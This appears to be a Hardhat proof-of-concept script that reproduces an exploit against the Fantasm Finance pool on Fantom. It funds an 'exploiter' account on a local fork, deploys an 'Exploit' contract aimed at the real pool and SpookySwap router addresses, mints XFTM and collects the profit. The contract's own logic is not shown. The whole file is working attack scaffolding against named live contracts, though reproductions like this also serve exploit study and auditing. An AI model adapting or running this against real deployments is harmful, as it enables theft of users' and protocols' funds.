const { ethers } = require("hardhat");

const execute = async () => {
    const fantasmPoolAddr = "0x880672ab1d46d987e5d663fc7476cd8df3c9f937";
    const spookySwapRouterAddr = "0xF491e7B69E4244ad4002BC14e878a34207E38c29";
    const [exploiter] = await ethers.getSigners();
    
    //top up the exploiter balance to 30000 FTM
    await network.provider.send("hardhat_setBalance", [
        exploiter.address,
        "0x65A4DA25D3016C00000",
    ]);

    const exploitContractFactory = await ethers.getContractFactory("Exploit");
    const exploitContract = await exploitContractFactory.deploy(spookySwapRouterAddr, fantasmPoolAddr);

    //first transaction to mint XFTM
    let tx = await exploitContract.execute({value : ethers.utils.parseEther('20000')});
    await tx.wait();

    //second transaction to collect XFTM from previous transaction
    tx = await exploitContract.collect();
    await tx.wait();

    console.log(ethers.utils.formatEther(await exploiter.getBalance().then(v => v.toString())));

}


execute()
    .then(() => process.exit(0))
    .catch(error => console.error(error));